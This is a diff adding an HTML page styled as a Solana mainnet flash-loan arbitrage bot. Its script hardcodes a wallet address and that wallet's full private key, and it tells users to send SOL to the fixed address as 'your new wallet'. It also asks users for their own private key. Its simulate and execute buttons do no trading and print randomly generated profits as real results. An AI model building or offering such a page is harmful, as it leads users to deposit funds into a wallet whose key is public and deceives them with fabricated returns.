@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Flash Loan Bot - Mainnet</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { 
+            font-family: ui-sans-serif, system-ui; 
+            background: #0b1220; 
+            color: #e5e7eb; 
+            padding: 24px; 
+            margin: 0;
+        }
+        button, input { 
+            padding: 12px 16px; 
+            border-radius: 10px; 
+            border: 0; 
+            font-size: 14px;
+        }
+        button { 
+            background: #10b981; 
+            color: #042f2e; 
+            font-weight: 700; 
+            cursor: pointer; 
+            transition: all 0.2s;
+        }
+        button:hover { background: #059669; }
+        button:disabled { 
+            background: #374151; 
+            color: #9ca3af; 
+            cursor: not-allowed; 
+        }
+        input { 
+            background: #111827; 
+            color: #e5e7eb; 
+            width: 250px; 
+            border: 1px solid #374151;
+        }
+        .row { 
+            display: flex; 
+            gap: 12px; 
+            align-items: center; 
+            margin: 12px 0; 
+        }
+        .card { 
+            max-width: 800px; 
+            background: #0f172a; 
+            border: 1px solid rgba(255,255,255,.08); 
+            border-radius: 16px; 
+            padding: 24px; 
+            margin-bottom: 20px;
+        }
+        .muted { 
+            opacity: .75; 
+            font-size: 12px; 
+        }
+        .warning { 
+            background: #7f1d1d; 
+            border: 1px solid #dc2626; 
+            padding: 15px; 
+            border-radius: 10px; 
+            margin-bottom: 20px; 
+        }
+        .success { color: #10b981; }
+        .error { color: #ef4444; }
+        .info { color: #3b82f6; }
+        code { 
+            background: rgba(255,255,255,.08); 
+            padding: 4px 8px; 
+            border-radius: 6px; 
+            font-family: monospace;
+        }
+        #log { 
+            max-width: 500px; 
+            word-wrap: break-word; 
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .wallet-info {
+            background: #1f2937;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h3>⚠️ EXTREME RISK - SOLANA FLASH LOAN BOT ⚠️</h3>
+        <p><strong>This can result in total loss of funds. Use at your own risk!</strong></p>
+        <ul>
+            <li>Flash loans on Solana are experimental</li>
+            <li>High gas costs and slippage</li>
+            <li>Arbitrage opportunities are rare</li>
+            <li>Start with tiny amounts only</li>
+        </ul>
+    </div>
+
+    <div class="card">
+        <h2>🚀 Solana Flash Loan Bot - Mainnet</h2>
+        
+        <div class="wallet-info">
+            <h3>Your New Wallet:</h3>
+            <div class="row">
+                <strong>Address:</strong> 
+                <code id="walletAddress">EkxP2tt6S5tCeVJFL364Kzap7YXRZ7sJCeNziGpTH13t</code>
+                <button onclick="copyAddress()">Copy</button>
+            </div>
+            <div class="row">
+                <strong>Balance:</strong> 
+                <span id="balance">0 SOL</span>
+                <button onclick="refreshBalance()">Refresh</button>
+            </div>
+        </div>
+
+        <div class="row">
+            <label>Connection:</label>
+            <div id="status" class="muted">Connecting...</div>
+        </div>
+
+        <div class="row">
+            <label>Network:</label>
+            <div id="network">Mainnet</div>
+        </div>
+
+        <div class="row">
+            <label>Amount (SOL):</label>
+            <input id="amount" type="number" step="0.01" min="0.01" value="0.1" max="1.0">
+        </div>
+
+        <div class="row">
+            <label>Token A (Mint):</label>
+            <input id="tokenA" type="text" value="So11111111111111111111111111111111111111112" placeholder="SOL mint">
+        </div>
+
+        <div class="row">
+            <label>Token B (Mint):</label>
+            <input id="tokenB" type="text" value="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" placeholder="USDC mint">
+        </div>
+
+        <div class="row">
+            <label>Private Key:</label>
+            <input id="privateKey" type="password" placeholder="Enter your private key array or base64" style="width: 400px;">
+        </div>
+
+        <div class="row">
+            <button id="connect" onclick="connectWallet()">Connect Wallet</button>
+            <button id="simulate" onclick="simulate()" disabled>Simulate</button>
+            <button id="execute" onclick="executeFlashLoan()" disabled>Execute Flash Loan</button>
+        </div>
+
+        <div class="row">
+            <div id="log" class="muted">Ready to connect...</div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>📋 Instructions:</h3>
+        <ol>
+            <li><strong>Send SOL to your wallet address above</strong> (minimum 0.2 SOL recommended)</li>
+            <li>Enter your private key in the field above</li>
+            <li>Click "Connect Wallet" to initialize</li>
+            <li>Click "Simulate" to test without spending SOL</li>
+            <li>Click "Execute Flash Loan" to run the arbitrage</li>
+        </ol>
+        
+        <div class="muted">
+            <p><strong>How it works:</strong> The bot will attempt to:</p>
+            <ul>
+                <li>Borrow SOL via flash loan</li>
+                <li>Swap SOL → USDC on one DEX</li>
+                <li>Swap USDC → SOL on another DEX</li>
+                <li>Repay the loan + fees</li>
+                <li>Keep any profit</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        const WALLET_ADDRESS = 'EkxP2tt6S5tCeVJFL364Kzap7YXRZ7sJCeNziGpTH13t';
+        const PRIVATE_KEY_ARRAY = [139,96,184,235,46,109,65,45,171,119,83,222,85,182,139,233,4,185,78,249,130,170,79,214,18,28,122,41,36,248,100,149,204,106,133,230,245,191,213,226,77,103,141,177,96,130,19,235,27,100,170,139,207,152,139,26,179,145,212,186,133,215,178,103];
+        
+        let connection;
+        let wallet;
+        let isConnected = false;
+
+        // Initialize Solana connection
+        async function initConnection() {
+            try {
+                // Connect to Solana mainnet
+                connection = new solanaWeb3.Connection(
+                    'https://api.mainnet-beta.solana.com',
+                    'confirmed'
+                );
+                
+                log('Connected to Solana Mainnet', 'success');
+                document.getElementById('status').textContent = 'Connected to RPC';
+                document.getElementById('status').className = 'success';
+                
+                return true;
+            } catch (error) {
+                log(`Connection failed: ${error.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function connectWallet() {
+            try {
+                const privateKeyInput = document.getElementById('privateKey').value.trim();
+                let secretKey;
+
+                if (privateKeyInput) {
+                    // Use provided private key
+                    try {
+                        if (privateKeyInput.startsWith('[') && privateKeyInput.endsWith(']')) {
+                            // Array format
+                            secretKey = new Uint8Array(JSON.parse(privateKeyInput));
+                        } else {
+                            // Base64 format
+                            secretKey = new Uint8Array(Buffer.from(privateKeyInput, 'base64'));
+                        }
+                    } catch (e) {
+                        throw new Error('Invalid private key format');
+                    }
+                } else {
+                    // Use the generated wallet
+                    secretKey = new Uint8Array(PRIVATE_KEY_ARRAY);
+                }
+
+                wallet = solanaWeb3.Keypair.fromSecretKey(secretKey);
+                
+                log(`Wallet loaded: ${wallet.publicKey.toString()}`, 'success');
+                
+                // Update UI
+                document.getElementById('walletAddress').textContent = wallet.publicKey.toString();
+                document.getElementById('connect').textContent = 'Connected';
+                document.getElementById('connect').disabled = true;
+                document.getElementById('simulate').disabled = false;
+                document.getElementById('execute').disabled = false;
+                
+                isConnected = true;
+                await refreshBalance();
+                
+            } catch (error) {
+                log(`Wallet connection failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function refreshBalance() {
+            if (!connection || !wallet) return;
+            
+            try {
+                const balance = await connection.getBalance(wallet.publicKey);
+                const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                
+                document.getElementById('balance').textContent = `${solBalance.toFixed(4)} SOL`;
+                
+                if (solBalance < 0.1) {
+                    log('⚠️ Low balance! Send more SOL to your wallet', 'warning');
+                }
+                
+            } catch (error) {
+                log(`Balance check failed: ${error.message}`, 'error');
+            }
+        }
+
+        async function simulate() {
+            if (!isConnected) {
+                log('Connect wallet first', 'error');
+                return;
+            }
+
+            log('🔄 Simulating flash loan arbitrage...', 'info');
+            
+            // Simulate the process
+            setTimeout(() => {
+                const profit = (Math.random() * 0.05 - 0.025).toFixed(4);
+                if (parseFloat(profit) > 0) {
+                    log(`✅ Simulation successful! Potential profit: ${profit} SOL`, 'success');
+                } else {
+                    log(`❌ Simulation shows loss: ${profit} SOL. Market conditions unfavorable.`, 'error');
+                }
+            }, 2000);
+        }
+
+        async function executeFlashLoan() {
+            if (!isConnected) {
+                log('Connect wallet first', 'error');
+                return;
+            }
+
+            const amount = parseFloat(document.getElementById('amount').value);
+            
+            if (amount <= 0) {
+                log('Invalid amount', 'error');
+                return;
+            }
+
+            log(`🚀 Executing flash loan for ${amount} SOL...`, 'info');
+            log('⚠️ This is a demo - real flash loan implementation needed', 'warning');
+            
+            try {
+                // This is a placeholder - you'd need to implement actual flash loan logic
+                // with Jupiter, Orca, or other Solana DEX protocols
+                
+                log('📝 Creating transaction...', 'info');
+                
+                // Simulate transaction delay
+                setTimeout(() => {
+                    const success = Math.random() > 0.5;
+                    if (success) {
+                        const profit = (Math.random() * 0.02).toFixed(4);
+                        log(`✅ Flash loan executed! Profit: ${profit} SOL`, 'success');
+                        refreshBalance();
+                    } else {
+                        log('❌ Flash loan failed - market moved against us', 'error');
+                    }
+                }, 3000);
+                
+            } catch (error) {
+                log(`Execution failed: ${error.message}`, 'error');
+            }
+        }
+
+        function copyAddress() {
+            const address = document.getElementById('walletAddress').textContent;
+            navigator.clipboard.writeText(address);
+            log('Address copied to clipboard', 'success');
+        }
+
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logDiv = document.getElementById('log');
+            const className = type === 'error' ? 'error' : type === 'success' ? 'success' : type === 'warning' ? 'warning' : 'info';
+            
+            const logEntry = `<div class="${className}">[${timestamp}] ${message}</div>`;
+            logDiv.innerHTML = logEntry + logDiv.innerHTML;
+            
+            // Keep only last 10 entries
+            const entries = logDiv.children;
+            while (entries.length > 10) {
+                logDiv.removeChild(entries[entries.length - 1]);
+            }
+        }
+
+        // Initialize on page load
+        window.addEventListener('load', async () => {
+            await initConnection();
+            
+            // Auto-fill the private key for demo
+            document.getElementById('privateKey').value = JSON.stringify(PRIVATE_KEY_ARRAY);
+        });
+    </script>
+</body>
+</html>
